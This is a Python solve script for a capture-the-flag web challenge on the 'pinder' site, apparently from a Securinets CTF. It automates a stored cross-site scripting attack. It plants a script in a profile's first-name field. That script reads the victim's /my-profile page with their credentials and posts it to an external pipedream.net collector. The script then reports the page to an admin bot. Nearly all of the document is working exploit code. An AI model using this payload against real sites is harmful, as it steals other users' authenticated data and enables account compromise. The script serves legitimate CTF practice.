import requests

BASE_URL = "http://pinder.securinets.tn"


s = requests.Session()

"""
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', '/my-profile', true);
xhr1.withCredentials = true;
xhr1.onreadystatechange = function() {
    if (xhr1.readyState == 4 && xhr1.status == 200) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', 'https://enadnwzwgiox.x.pipedream.net/', true);
        xhr2.send(xhr1.responseText);
    } };
xhr1.send();
"""

# Can base64 encode it or minfy it whatever you want !
PAYLOAD = """<script>var xhr1=new XMLHttpRequest;xhr1.open("GET","/my-profile",!0),xhr1.withCredentials=!0,xhr1.onreadystatechange=function(){if(4==xhr1.readyState&&200==xhr1.status){var e=new XMLHttpRequest;e.open("POST","https://enadnwzwgiox.x.pipedream.net/",!0),e.send(xhr1.responseText)}},xhr1.send();</script>"""


print(PAYLOAD)


def register(username, password):
    global s
    return s.post(
        BASE_URL + "/register", json={"username": username, "password": password}
    )


def login(username, password):
    global s
    return s.post(
        BASE_URL + "/login", json={"username": username, "password": password}
    )


def create_profile(first_name, last_name, profile_picture_link):
    global s
    return s.post(
        BASE_URL + "/create-profile",
        json={
            "first_name": first_name,
            "last_name": last_name,
            "profile_picture_link": profile_picture_link,
        },
    )


def get_profile():
    global s
    return s.get(BASE_URL + "/my-profile").text


def report(url):
    global s
    return s.post(BASE_URL + "/report", json={"url": url})


register("evilnyanya16", "evilnyaya16")
login("evilnyanya16", "evilnyaya16")
create_profile(PAYLOAD, "xxx", "xxxx")
profile_content = get_profile()

# A bit hacky but it's to ge the line and gives the id directly. no need to use regex :D
print(
    profile_content[
        profile_content.index('style="display:none">#')
        + len('style="display:none">#') : 5
        + profile_content.index('style="display:none">#')
        + len('style="display:none">#')
    ]
)

id = input("Your id ? you can find it here <-")

print("http://127.0.0.1" + f"/profile/{id}")

report("http://127.0.0.1" + f"/profile/{id}")  # report to admin bot

# Wait a bit and submit flag now ;D
